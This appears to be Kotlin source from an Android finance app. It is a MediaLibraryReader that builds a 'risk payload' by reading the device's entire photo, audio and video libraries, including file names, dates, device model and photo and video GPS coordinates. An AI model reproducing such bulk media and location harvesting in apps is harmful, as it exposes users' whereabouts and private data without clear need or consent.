package com.vaycore.finance.util.runtime

import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import com.vaycore.finance.App
import org.json.JSONArray
import org.json.JSONObject

/** Reads media-store data used by the risk payload. */
object MediaLibraryReader {

    private val imageProjection = arrayOf(
        MediaStore.Images.Media.DATE_ADDED,
        MediaStore.Images.Media.DATE_TAKEN,
        MediaStore.Images.Media.AUTHOR,
        MediaStore.Images.Media.HEIGHT,
        MediaStore.Images.Media.WIDTH,
        MediaStore.Images.Media.DISPLAY_NAME,
        MediaStore.Images.Media.LATITUDE,
        MediaStore.Images.Media.LONGITUDE
    )

    private val audioProjection = arrayOf(
        MediaStore.Audio.Media.DATA,
        MediaStore.Audio.Media.DISPLAY_NAME,
        MediaStore.Audio.Media.MIME_TYPE,
        MediaStore.Audio.Media.DATE_ADDED,
        MediaStore.Audio.Media.DATE_MODIFIED,
        MediaStore.Audio.Media.DURATION,
        MediaStore.Audio.Media.SIZE,
        MediaStore.Audio.Media._ID
    )

    private val videoProjection = arrayOf(
        MediaStore.MediaColumns._ID,
        MediaStore.MediaColumns.DATA,
        MediaStore.MediaColumns.DISPLAY_NAME,
        MediaStore.MediaColumns.MIME_TYPE,
        MediaStore.MediaColumns.SIZE,
        MediaStore.MediaColumns.DATE_ADDED,
        MediaStore.MediaColumns.DATE_MODIFIED,
        MediaStore.MediaColumns.WIDTH,
        MediaStore.MediaColumns.HEIGHT,
        MediaStore.Video.VideoColumns.LATITUDE,
        MediaStore.Video.VideoColumns.LONGITUDE,
        MediaStore.Video.VideoColumns.DURATION
    )

    fun getImages(external: Boolean = true): JSONArray {
        val uri = if (external) {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        } else {
            MediaStore.Images.Media.INTERNAL_CONTENT_URI
        }
        val result = JSONArray()

        App.appContext.contentResolver.query(
            uri,
            imageProjection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
        )?.use { cursor ->
            val addedIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val takenIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
            val authorIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.AUTHOR)
            val heightIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
            val widthIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
            val nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val latIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.LATITUDE)
            val lonIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.LONGITUDE)

            while (cursor.moveToNext()) {
                result.put(JSONObject().apply {
                    put("filename", cursor.getString(nameIndex) ?: "")
                    put("author", if (Build.VERSION.SDK_INT >= 30) cursor.getString(authorIndex) else JSONObject.NULL)
                    put("height", cursor.getInt(heightIndex))
                    put("width", cursor.getInt(widthIndex))
                    put("latitude", cursor.getDouble(latIndex))
                    put("longitude", cursor.getDouble(lonIndex))
                    put("takeTime", if (Build.VERSION.SDK_INT >= 29) cursor.getLong(takenIndex).toString() else JSONObject.NULL)
                    put("createTime", cursor.getLong(addedIndex).toString())
                    put("mobileModel", Build.MODEL ?: "")
                })
            }
        }
        return result
    }

    fun getLatestImageUpdateTime(): Long {
        App.appContext.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media.DATE_MODIFIED),
            null,
            null,
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
        )?.use { cursor ->
            if (cursor.moveToFirst()) {
                return cursor.getLong(
                    cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)
                )
            }
        }
        return -1L
    }

    fun getAudioInfo(): JSONObject {
        val external = queryAudio(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
        val internal = queryAudio(MediaStore.Audio.Media.INTERNAL_CONTENT_URI)
        val audios = JSONArray()
        appendAll(audios, external)
        appendAll(audios, internal)

        return JSONObject().apply {
            put("externalCont", external.length())
            put("internalCont", internal.length())
            put("audios", audios)
        }
    }

    fun getVideoInfo(): JSONObject {
        val result = JSONObject()
        runCatching {
            val externalCursor = queryVideos(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
            val internalCursor = queryVideos(MediaStore.Video.Media.INTERNAL_CONTENT_URI)
            result.apply {
                put("externalCount", externalCursor?.count ?: 0)
                put("internalCount", internalCursor?.count ?: 0)
                put("videos", JSONArray().apply {
                    appendAll(this, parseVideos(externalCursor))
                    appendAll(this, parseVideos(internalCursor))
                })
            }
        }
        return result
    }

    private fun queryAudio(uri: Uri): JSONArray {
        val result = JSONArray()
        runCatching {
            App.appContext.contentResolver.query(
                uri,
                audioProjection,
                null,
                null,
                "${MediaStore.Audio.Media.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val idIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val dateModifiedIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
                val dateAddedIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val mimeIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val nameIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val durationIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DURATION)

                while (cursor.moveToNext()) {
                    result.put(JSONObject().apply {
                        put("id", cursor.getLong(idIndex))
                        put("dateModified", cursor.getLong(dateModifiedIndex).toString())
                        put("dateAdded", cursor.getLong(dateAddedIndex).toString())
                        put("size", cursor.getLong(sizeIndex).toString())
                        put("mimeType", cursor.getString(mimeIndex))
                        put("name", cursor.getString(nameIndex))
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            put("duration", cursor.getFloat(durationIndex))
                        }
                    })
                }
            }
        }
        return result
    }

    private fun queryVideos(uri: Uri): Cursor? = App.appContext.contentResolver.query(
        uri,
        videoProjection,
        null,
        null,
        "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
    )

    private fun parseVideos(cursor: Cursor?): JSONArray {
        val videos = JSONArray()
        cursor ?: return videos

        cursor.use {
            while (it.moveToNext()) {
                videos.put(JSONObject().apply {
                    put("_id", it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)))
                    put("name", it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)))
                    put("mimeType", it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)))
                    put("size", it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
                    put("dateAdded", it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)))
                    put("dateModified", it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)))
                    put("width", it.getInt(it.getColumnIndexOrThrow(MediaStore.MediaColumns.WIDTH)))
                    put("height", it.getInt(it.getColumnIndexOrThrow(MediaStore.MediaColumns.HEIGHT)))
                    put("duration", it.getFloat(it.getColumnIndexOrThrow(MediaStore.Video.VideoColumns.DURATION)))
                    put("latitude", it.getDouble(it.getColumnIndexOrThrow(MediaStore.Video.VideoColumns.LATITUDE)))
                    put("longitude", it.getDouble(it.getColumnIndexOrThrow(MediaStore.Video.VideoColumns.LONGITUDE)))
                })
            }
        }
        return videos
    }

    private fun appendAll(target: JSONArray, source: JSONArray) {
        for (index in 0 until source.length()) {
            target.put(source.get(index))
        }
    }
}
